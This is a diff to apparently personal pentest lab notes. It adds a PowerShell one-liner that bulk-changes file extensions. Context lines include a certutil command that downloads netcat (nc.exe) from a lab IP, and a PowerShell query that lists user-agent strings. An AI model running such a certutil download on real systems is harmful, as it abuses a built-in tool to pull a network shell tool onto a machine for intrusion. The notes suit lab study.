@@ -76,3 +76,9 @@ certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```Powershell
 PS C:\htb> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | Format-List
 ```
+
+## Bulk change extension for files in the current directory
+
+```Powershell
+ls | Rename-Item -NewName { [io.path]::ChangeExtension($_.name, "json") }
+```
